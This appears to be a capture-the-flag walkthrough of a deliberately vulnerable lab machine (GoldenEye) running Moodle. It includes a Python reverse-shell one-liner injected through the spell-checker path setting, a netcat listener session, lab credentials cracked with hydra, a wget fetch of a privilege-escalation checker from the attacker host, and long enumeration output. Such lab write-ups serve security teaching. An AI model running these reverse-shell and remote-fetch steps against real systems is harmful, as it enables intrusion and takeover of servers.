python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

Spell engine : PSSpellSpell

Now go to `Navigation > My profile > Blog > Add a new entry` and clik on the “Toggle spell checker” icon.

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.146.26.
Ncat: Connection from 10.10.146.26:47580.
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ python -c 'import pty;pty.spawn("/bin/bash")'
<.9/plugins/spellchecker$ python -c 'import pty;pty.spawn("/bin/bash")'      
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ whoami
whoami
www-data

:)

```

![[Pasted image 20230203140952.png]]
![[Pasted image 20230203142017.png]]
![[Pasted image 20230203142329.png]]
![[Pasted image 20230203142530.png]]


If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.

If you're on Linux edit your "/etc/hosts" file and add:

	<machines ip> severnaya-station.com

If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file

 Completed

Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir

 Completed

Try using the credentials you found earlier. Which user can you login as?

*xenia*

Have a poke around the site. What other user can you find?


*doak*

What was this users password?

pop3 + hydra

*goat*

Use this users credentials to go through all the services you have found to reveal more emails.

 Completed

What is the next user you can find from doak?

Emails, emails, emails..

*dr_doak*

What is this users password?

*4England!*

Take a look at their files on the moodle (severnaya-station.com)

 Completed

Download the attachments and see if there are any hidden messages inside them?

Use exiftool

 Completed


Using the information you found in the last task, login with the newly found user.

 Completed

As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.

Take a look into Aspell, the spell checker plugin.

Settings->Aspell->Path to aspell field, add your code to be executed. Then create a new page and "spell check it".

 Completed



###  Privilege Escalation

Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.

Answer the questions below

```
              
┌──(kali㉿kali)-[~/Downloads]
└─$ nano linuxprivchecker.py 
                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.146.26 - - [03/Feb/2023 14:29:44] "GET /linuxprivchecker.py HTTP/1.1" 200 

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ wget http://10.8.19.103:8000/linuxprivchecker.py
wget http://10.8.19.103:8000/linuxprivchecker.py
--2023-02-03 11:29:44--  http://10.8.19.103:8000/linuxprivchecker.py
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25304 (25K) [text/x-python]
Saving to: 'linuxprivchecker.py'

100%[======================================>] 25,304       122KB/s   in 0.2s   

2023-02-03 11:29:45 (122 KB/s) - 'linuxprivchecker.py' saved [25304/25304]

www-data@ubuntu:/tmp$ chmod +x linuxprivchecker.py


www-data@ubuntu:/tmp$ python linuxprivchecker.py
python linuxprivchecker.py
=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel
    Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014

[+] Hostname
    ubuntu

[+] Operating System
    GoldenEye Systems **TOP SECRET**  \n \l

[*] GETTING NETWORKING INFO...

[+] Interfaces
    eth0      Link encap:Ethernet  HWaddr 02:67:98:7d:e6:0d
    inet addr:10.10.146.26  Bcast:10.10.255.255  Mask:255.255.0.0
    inet6 addr: fe80::67:98ff:fe7d:e60d/64 Scope:Link
    UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
    RX packets:90242 errors:0 dropped:0 overruns:0 frame:0
    TX packets:89020 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:1000
    RX bytes:5596225 (5.5 MB)  TX bytes:6666487 (6.6 MB)
    lo        Link encap:Local Loopback
    inet addr:127.0.0.1  Mask:255.0.0.0
    inet6 addr: ::1/128 Scope:Host
    UP LOOPBACK RUNNING  MTU:65536  Metric:1
    RX packets:10096 errors:0 dropped:0 overruns:0 frame:0
    TX packets:10096 errors:0 dropped:0 overruns:0 carrier:0
    collisions:0 txqueuelen:0
    RX bytes:5848792 (5.8 MB)  TX bytes:5848792 (5.8 MB)

[+] Netstat
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:55006           0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:55007           0.0.0.0:*               LISTEN      -
    tcp        0    588 10.10.146.26:47580      10.8.19.103:1337        ESTABLISHED 2276/python
    tcp6       0      0 ::1:5432                :::*                    LISTEN      -
    tcp6       0      0 :::25                   :::*                    LISTEN      -
    tcp6       0      0 :::55006                :::*                    LISTEN      -
    tcp6       0      0 :::55007                :::*                    LISTEN      -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 10.10.146.26:80         10.8.19.103:49914       ESTABLISHED -
    tcp6       0      0 ::1:54952               ::1:5432                ESTABLISHED -
    tcp6       0      0 ::1:5432                ::1:54952               ESTABLISHED -
    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
    udp        0      0 0.0.0.0:44142           0.0.0.0:*                           -
    udp6       0      0 ::1:42728               ::1:42728               ESTABLISHED -
    udp6       0      0 :::49245                :::*                                -

[+] Route
    Kernel IP routing table
    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
    default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
    10.10.0.0       *               255.255.0.0     U     0      0        0 eth0

[*] GETTING FILESYSTEM INFO...

[+] Mount results
    /dev/xvda1 on / type ext4 (rw,errors=remount-ro)
    proc on /proc type proc (rw,noexec,nosuid,nodev)
    sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
    none on /sys/fs/cgroup type tmpfs (rw)
    none on /sys/fs/fuse/connections type fusectl (rw)
    none on /sys/kernel/debug type debugfs (rw)
    none on /sys/kernel/security type securityfs (rw)
    udev on /dev type devtmpfs (rw,mode=0755)
    devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
    tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
    none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
    none on /run/shm type tmpfs (rw,nosuid,nodev)
    none on /run/user type tmpfs (rw,noexec,nosuid,nodev,size=104857600,mode=0755)
    none on /sys/fs/pstore type pstore (rw)
    binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,noexec,nosuid,nodev)
    systemd on /sys/fs/cgroup/systemd type cgroup (rw,noexec,nosuid,nodev,none,name=systemd)

[+] fstab entries
    # /etc/fstab: static file system information.
    #
    # Use 'blkid' to print the universally unique identifier for a
    # device; this may be used with UUID= as a more robust way to name devices
    # that works even if disks are added and removed. See fstab(5).
    #
    # <file system> <mount point>   <type>  <options>       <dump>  <pass>
    # / was on /dev/sda1 during installation
    UUID=204d8d44-a0a5-466b-9163-e9e5f4433231	/	ext4	errors=remount-ro	0 1
    # swap was on /dev/sda5 during installation
    UUID=b2003a5c-4e37-4edf-bc55-25cd1fe2561d	none	swap	sw	0 0
    #/dev/fd0	/media/floppy0	auto	rw,user,noauto,exec,utf8	0 0

[+] Scheduled cron jobs
    -rw-r--r-- 1 root root  722 Feb  8  2013 /etc/crontab
    /etc/cron.d:
    total 16
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    -rw-r--r--  1 root root  510 Mar 16  2018 php5
    /etc/cron.daily:
    total 68
    drwxr-xr-x  2 root root  4096 Apr 23  2018 .
    drwxr-xr-x 91 root root  4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root   102 Feb  8  2013 .placeholder
    -rwxr-xr-x  1 root root   625 Apr 18  2018 apache2
    -rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
    -rwxr-xr-x  1 root root   314 Feb 17  2014 aptitude
    -rwxr-xr-x  1 root root   355 Jun  4  2013 bsdmainutils
    -rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
    -rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
    -rwxr-xr-x  1 root root  1261 Apr 10  2014 man-db
    -rwxr-xr-x  1 root root   435 Jun 20  2013 mlocate
    -rwxr-xr-x  1 root root   249 Feb 16  2014 passwd
    -rwxr-xr-x  1 root root  2417 May 13  2013 popularity-contest
    -rwxr-xr-x  1 root root   328 Jul 18  2014 upstart
    /etc/cron.hourly:
    total 12
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    /etc/cron.monthly:
    total 12
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    /etc/cron.weekly:
    total 24
    drwxr-xr-x  2 root root 4096 Apr 23  2018 .
    drwxr-xr-x 91 root root 4096 Feb  3 09:47 ..
    -rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
    -rwxr-xr-x  1 root root  730 Feb 23  2014 apt-xapian-index
    -rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
    -rwxr-xr-x  1 root root  771 Apr 10  2014 man-db

[+] Writable cron dirs


[*] ENUMERATING USER AND ENVIRONMENTAL INFO...

[+] Logged in User Activity
    11:30:25 up  1:43,  0 users,  load average: 0.00, 0.01, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Super Users Found:
    root

[+] Environment
    SHLVL=2
    OLDPWD=/var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker
    APACHE_RUN_DIR=/var/run/apache2
    APACHE_PID_FILE=/var/run/apache2/apache2.pid
    _=/usr/bin/python
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    APACHE_LOCK_DIR=/var/lock/apache2
    LANG=C
    APACHE_RUN_USER=www-data
    APACHE_RUN_GROUP=www-data
    APACHE_LOG_DIR=/var/log/apache2
    PWD=/tmp

[+] Root and current user history (depends on privs)

[+] Sudoers (privileged)

[+] All users
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    libuuid:x:100:101::/var/lib/libuuid:
    syslog:x:101:104::/home/syslog:/bin/false
    messagebus:x:102:105::/var/run/dbus:/bin/false
    boris:x:1000:1000:boris,,,:/home/boris:/usr/sbin/nologin
    dovecot:x:103:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
    dovenull:x:104:113:Dovecot login user,,,:/nonexistent:/bin/false
    postfix:x:105:114::/var/spool/postfix:/bin/false
    postgres:x:106:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    natalya:x:1002:1002:,,,:/home/natalya:/usr/sbin/nologin
    doak:x:1001:1001:,,,:/home/doak:/usr/sbin/nologin

[+] Current User
    www-data

[+] Current User ID
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...

[+] World Writeable Directories for User/Group 'Root'
    drwxrwxrwt 4 root root 4096 Feb  3 11:29 /tmp
    drwxrwxrwt 2 root root 4096 Feb  3 09:47 /tmp/.X11-unix
    drwxrwxrwt 2 root root 4096 Feb  3 09:47 /tmp/.ICE-unix
    drwxrwxrwt 2 root root 40 Feb  3 09:47 /run/shm
    drwxrwxrwt 3 root root 60 Feb  3 09:48 /run/lock
    drwxrwxrwt 2 root root 4096 Apr 23  2018 /var/tmp
    drwx-wx-wt 3 root root 4096 Apr 23  2018 /var/lib/php5

[+] World Writeable Directories for Users other than Root
    drwxrwsrwx 7 www-data www-data 4096 Apr 23  2018 /var/www/moodledata
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/trashdir
    drwxrwsrwx 6 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/js
    drwxrwsrwx 3 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/lang
    drwxrwsrwx 2 www-data www-data 12288 Feb  3 11:17 /var/www/moodledata/cache/lang/en
    drwxrwsrwx 3 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme
    drwxrwsrwx 4 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme/standard
    drwxrwsrwx 21 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_randomsamatch
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_numerical
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_shortanswer
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multianswer
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_user
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_match
    drwxrwsrwx 7 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/i
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/u
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/a
    drwxrwsrwx 2 www-data www-data 4096 Feb  3 10:57 /var/www/moodledata/cache/theme/standard/pix/moodle/t
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/moodle/f
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_truefalse
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_upload
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedsimple
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_essay
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_recent
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculatedmulti
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_calculated
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/repository_local
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/cache/theme/standard/pix/theme/tab
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/forum
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_multichoice
    drwxrwsrwx 2 www-data www-data 4096 Apr 25  2018 /var/www/moodledata/cache/theme/standard/pix/qtype_description
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/theme/standard/css
    drwxrwsrwx 4 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/HTML
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/cache/htmlpurifier/URI
    drwxrwsrwx 2 www-data www-data 4096 Apr 23  2018 /var/www/moodledata/lang
    drwxrwsrwx 4 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/typo3temp
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/typo3temp/cs
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/temp/forms
    drwxrwsrwx 6 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/82
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/82/34
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/a6
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/a6/f9
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/ad
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/ad/5c
    drwxrwsrwx 3 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/da
    drwxrwsrwx 2 www-data www-data 4096 Apr 24  2018 /var/www/moodledata/filedir/da/39

[+] World Writable Files
    -rwxrwxrwx 1 www-data www-data 25304 Feb  3 11:29 /tmp/linuxprivchecker.py
    -rw-rw-rw- 1 www-data www-data 8107 Apr 25  2018 /var/www/moodledata/cache/js/minify_9b2e0498e8b0324830c52b585d61d9d0
    -rw-rw-rw- 1 www-data www-data 2188 Apr 25  2018 /var/www/moodledata/cache/js/minify_9b2e0498e8b0324830c52b585d61d9d0.gz
    -rw-rw-rw- 1 www-data www-data 1309 Apr 24  2018 /var/www/moodledata/cache/js/minify_e6df61697e42dfd2c4038788f632b50d.gz
    -rw-rw-rw- 1 www-data www-data 4291 Apr 24  2018 /var/www/moodledata/cache/js/minify_4e80f058aff2d8a2b8d52146da462c74.gz
    -rw-rw-rw- 1 www-data www-data 9823 Apr 23  2018 /var/www/moodledata/cache/js/minify_eec518a0dda5a67f3a056f40e92c7e21.gz
    -rw-rw-rw- 1 www-data www-data 35177 Apr 24  2018 /var/www/moodledata/cache/js/minify_bbe4f978fd00f80385dabb50369f5724
    -rw-rw-rw- 1 www-data www-data 16710 Apr 24  2018 /var/www/moodledata/cache/js/minify_4e80f058aff2d8a2b8d52146da462c74
    -rw-rw-rw- 1 www-data www-data 2163 Apr 24  2018 /var/www/moodledata/cache/js/minify_b8bd2995a4274eadd45998e1500f98d1
    -rw-rw-rw- 1 www-data www-data 374 Apr 24  2018 /var/www/moodledata/cache/js/minify_f0324aaed00ab522adfef63f52e04c19.gz
    -rw-rw-rw- 1 www-data www-data 1761 Apr 24  2018 /var/www/moodledata/cache/js/minify_9432984ad43465dc39ce4ee74814371a.gz
    -rw-rw-rw- 1 www-data www-data 5969 Apr 23  2018 /var/www/moodledata/cache/js/minify_43c0a2539b50ca07023e5aa00f3d21ef.gz
    -rw-rw-rw- 1 www-data www-data 829 Apr 24  2018 /var/www/moodledata/cache/js/minify_b8bd2995a4274eadd45998e1500f98d1.gz
    -rw-rw-rw- 1 www-data www-data 24468 Apr 25  2018 /var/www/moodledata/cache/js/minify_ec62647c1a86c40a73f3e9d932db7d1b
    -rw-rw-rw- 1 www-data www-data 3831 Apr 25  2018 /var/www/moodledata/cache/js/minify_7c0a0992224807c264a4100b8ad73166
    -rw-rw-rw- 1 www-data www-data 796 Apr 24  2018 /var/www/moodledata/cache/js/minify_f0324aaed00ab522adfef63f52e04c19
    -rw-rw-rw- 1 www-data www-data 8504 Apr 24  2018 /var/www/moodledata/cache/js/minify_bbe4f978fd00f80385dabb50369f5724.gz
    -rw-rw-rw- 1 www-data www-data 1021 Apr 24  2018 /var/www/moodledata/cache/js/minify_1fc944760c811961c7c2d9c8d0625c4b
    -rw-rw-rw- 1 www-data www-data 1053 Apr 25  2018 /var/www/moodledata/cache/js/minify_7c0a0992224807c264a4100b8ad73166.gz
    -rw-rw-rw- 1 www-data www-data 22718 Apr 23  2018 /var/www/moodledata/cache/js/minify_43c0a2539b50ca07023e5aa00f3d21ef
    -rw-rw-rw- 1 www-data www-data 449 Apr 24  2018 /var/www/moodledata/cache/js/minify_1fc944760c811961c7c2d9c8d0625c4b.gz
    -rw-rw-rw- 1 www-data www-data 33643 Apr 23  2018 /var/www/moodledata/cache/js/minify_eec518a0dda5a67f3a056f40e92c7e21
    -rw-rw-rw- 1 www-data www-data 1167 Apr 24  2018 /var/www/moodledata/cache/js/minify_a6034b830fbc24cce8d47eb9468a702d
    -rw-rw-rw- 1 www-data www-data 7167 Apr 24  2018 /var/www/moodledata/cache/js/minify_9432984ad43465dc39ce4ee74814371a
    -rw-rw-rw- 1 www-data www-data 5019 Apr 25  2018 /var/www/moodledata/cache/js/minify_ec62647c1a86c40a73f3e9d932db7d1b.gz
    -rw-rw-rw- 1 www-data www-data 4649 Apr 24  2018 /var/www/moodledata/cache/js/minify_e6df61697e42dfd2c4038788f632b50d
    -rw-rw-rw- 1 www-data www-data 451 Apr 24  2018 /var/www/moodledata/cache/js/minify_a6034b830fbc24cce8d47eb9468a702d.gz
    -rw-rw-rw- 1 www-data www-data 1362 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_page.php
    -rw-rw-rw- 1 www-data www-data 1336 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_spamcleaner.php
    -rw-rw-rw- 1 www-data www-data 9521 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_blog.php
    -rw-rw-rw- 1 www-data www-data 99 Apr 23  2018 /var/www/moodledata/cache/lang/en/filter_glossary.php
    -rw-rw-rw- 1 www-data www-data 479 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_course_list.php
    -rw-rw-rw- 1 www-data www-data 1003 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_meta.php
    -rw-rw-rw- 1 www-data www-data 3196 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_magazine.php
    -rw-rw-rw- 1 www-data www-data 307 Apr 23  2018 /var/www/moodledata/cache/lang/en/report_outline.php
    -rw-rw-rw- 1 www-data www-data 3743 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_choice.php
    -rw-rw-rw- 1 www-data www-data 11322 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_auth.php
    -rw-rw-rw- 1 www-data www-data 3272 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_cas.php
    -rw-rw-rw- 1 www-data www-data 372 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_selfcompletion.php
    -rw-rw-rw- 1 www-data www-data 4534 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_community.php
    -rw-rw-rw- 1 www-data www-data 6194 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_countries.php
    -rw-rw-rw- 1 www-data www-data 3415 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_url.php
    -rw-rw-rw- 1 www-data www-data 85 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_comments.php
    -rw-rw-rw- 1 www-data www-data 93 Apr 23  2018 /var/www/moodledata/cache/lang/en/editor_textarea.php
    -rw-rw-rw- 1 www-data www-data 841 Apr 23  2018 /var/www/moodledata/cache/lang/en/message_jabber.php
    -rw-rw-rw- 1 www-data www-data 880 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_access.php
    -rw-rw-rw- 1 www-data www-data 8465 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_repository.php
    -rw-rw-rw- 1 www-data www-data 96 Apr 23  2018 /var/www/moodledata/cache/lang/en/tool_replace.php
    -rw-rw-rw- 1 www-data www-data 79 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_login.php
    -rw-rw-rw- 1 www-data www-data 449 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_license.php
    -rw-rw-rw- 1 www-data www-data 2934 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_block.php
    -rw-rw-rw- 1 www-data www-data 2654 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_brick.php
    -rw-rw-rw- 1 www-data www-data 11241 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_wiki.php
    -rw-rw-rw- 1 www-data www-data 12724 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_portfolio.php
    -rw-rw-rw- 1 www-data www-data 5182 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_enrol.php
    -rw-rw-rw- 1 www-data www-data 4616 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_formal_white.php
    -rw-rw-rw- 1 www-data www-data 2646 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_splash.php
    -rw-rw-rw- 1 www-data www-data 310 Apr 23  2018 /var/www/moodledata/cache/lang/en/repository_user.php
    -rw-rw-rw- 1 www-data www-data 128 Feb  3 11:17 /var/www/moodledata/cache/lang/en/webservice_rest.php
    -rw-rw-rw- 1 www-data www-data 6973 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_chat.php
    -rw-rw-rw- 1 www-data www-data 250 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_webservice.php
    -rw-rw-rw- 1 www-data www-data 510 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_folder.php
    -rw-rw-rw- 1 www-data www-data 177 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_private_files.php
    -rw-rw-rw- 1 www-data www-data 495 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_deferredcbm.php
    -rw-rw-rw- 1 www-data www-data 1041 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_fc.php
    -rw-rw-rw- 1 www-data www-data 960 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_myprofile.php
    -rw-rw-rw- 1 www-data www-data 1131 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_langconfig.php
    -rw-rw-rw- 1 www-data www-data 1455 Apr 23  2018 /var/www/moodledata/cache/lang/en/enrol_guest.php
    -rw-rw-rw- 1 www-data www-data 227 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_interactive.php
    -rw-rw-rw- 1 www-data www-data 9444 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_calculated.php
    -rw-rw-rw- 1 www-data www-data 2205 Apr 23  2018 /var/www/moodledata/cache/lang/en/message_email.php
    -rw-rw-rw- 1 www-data www-data 993 Apr 23  2018 /var/www/moodledata/cache/lang/en/auth_email.php
    -rw-rw-rw- 1 www-data www-data 2540 Apr 23  2018 /var/www/moodledata/cache/lang/en/theme_sky_high.php
    -rw-rw-rw- 1 www-data www-data 124 Feb  3 11:17 /var/www/moodledata/cache/lang/en/webservice_amf.php
    -rw-rw-rw- 1 www-data www-data 144 Apr 25  2018 /var/www/moodledata/cache/lang/en/qbehaviour_immediatefeedback.php
    -rw-rw-rw- 1 www-data www-data 2912 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_multianswer.php
    -rw-rw-rw- 1 www-data www-data 101 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_calendar_upcoming.php
    -rw-rw-rw- 1 www-data www-data 13685 Apr 23  2018 /var/www/moodledata/cache/lang/en/mod_feedback.php
    -rw-rw-rw- 1 www-data www-data 3140 Apr 25  2018 /var/www/moodledata/cache/lang/en/qtype_multichoice.php
    -rw-rw-rw- 1 www-data www-data 17859 Apr 23  2018 /var/www/moodledata/cache/lang/en/core_hub.php
    -rw-rw-rw- 1 www-data www-data 3430 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_rss_client.php
    -rw-rw-rw- 1 www-data www-data 2024 Apr 23  2018 /var/www/moodledata/cache/lang/en/block_quiz_results.php
